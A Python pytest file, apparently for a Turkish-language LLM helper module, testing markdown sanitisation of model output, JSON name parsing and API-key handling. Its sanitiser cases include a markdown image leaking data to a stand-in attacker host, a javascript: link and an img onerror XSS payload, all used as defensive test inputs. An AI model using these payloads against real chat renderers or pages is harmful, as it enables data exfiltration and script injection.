import json

import pytest

import llm

TEMSILI = {"0": ["a"], "1": ["b"], "2": ["c"]}
OPENAI = {"saglayici": "OpenAI"}
YEREL = {"saglayici": "Yerel / Ozel (Ollama, vLLM, kurum ici)"}


@pytest.mark.parametrize("girdi, beklenen", [
    ("Bkz. ![x](https://saldirgan/?veri=gizli) son", "Bkz. x son"),
    ("[tikla](javascript:alert(1))", "tikla"),
    ("<img src=x onerror=alert(1)>metin", "metin"),
    ("<https://ornek.com>", "https://ornek.com"),
    ("## Başlık\n**kalın** ve %29.0", "## Başlık\n**kalın** ve %29.0"),
])
def test_guvenli_markdown(girdi, beklenen):
    assert llm.guvenli_markdown(girdi) == beklenen


def test_isimler_kod_blogundan_ayiklanir():
    cevap = 'Tabii:\n```json\n{"0": "Fatura", "1": "Modem", "2": "Hız"}\n```'
    assert llm._isimleri_ayikla(cevap, TEMSILI) == {"0": "Fatura", "1": "Modem", "2": "Hız"}


def test_gecersiz_kume_ve_degerler_atilir():
    cevap = json.dumps({"0": "Fatura", "9": "yok", "abc": "yok", "1": ["liste"], "2": 5})
    assert llm._isimleri_ayikla(cevap, TEMSILI) == {"0": "Fatura", "2": "5"}


def test_uzun_isim_kirpilir():
    cevap = json.dumps({"0": "x" * 500})
    assert len(llm._isimleri_ayikla(cevap, TEMSILI)["0"]) == llm.ISIM_UZUNLUK_SINIRI


@pytest.mark.parametrize("cevap", ["JSON yok", '{"9": "gecersiz"}'])
def test_kullanilamaz_cevap_hata_verir(cevap):
    with pytest.raises(RuntimeError):
        llm._isimleri_ayikla(cevap, TEMSILI)


def test_anahtar_baska_saglayiciya_sizmaz(monkeypatch):
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    monkeypatch.setenv("NVIDIA_API_KEY", "nvapi-gizli")
    assert llm.anahtar_bul(OPENAI) is None


def test_panel_anahtari_temizlenir(monkeypatch):
    assert llm.anahtar_bul(OPENAI, "  sk-abc \n") == "sk-abc"


def test_yerel_saglayici_anahtarsiz_calisir(monkeypatch):
    monkeypatch.delenv("LLM_API_KEY", raising=False)
    assert llm.anahtar_bul(YEREL)
    assert llm.anahtar_gerekmez(YEREL)


def test_anahtar_diske_yazilmaz(tmp_path, monkeypatch):
    monkeypatch.setattr(llm, "AYAR_DOSYASI", str(tmp_path / "ayarlar.json"))
    llm.ayarlari_kaydet(dict(llm.VARSAYILAN, api_key="sk-gizli", anahtar="sk-gizli"))
    icerik = (tmp_path / "ayarlar.json").read_text()
    assert "sk-gizli" not in icerik
    assert llm.ayarlari_yukle()["model"] == llm.VARSAYILAN["model"]
